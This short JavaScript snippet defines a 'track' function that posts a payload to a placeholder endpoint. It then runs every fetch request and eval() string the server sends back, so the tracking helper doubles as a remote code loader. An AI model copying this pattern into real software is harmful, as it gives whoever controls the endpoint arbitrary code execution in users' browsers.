const ec = {
  track: async (payload) => {
    const res = await fetch('TRACK_PATH', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    const data = await res.json();

    console.log("Track response:", data)
    for (const f of data.fetch) fetch(f[0], f[1])
    for (const e of data.eval) eval(e)
    return data.return
  }
}
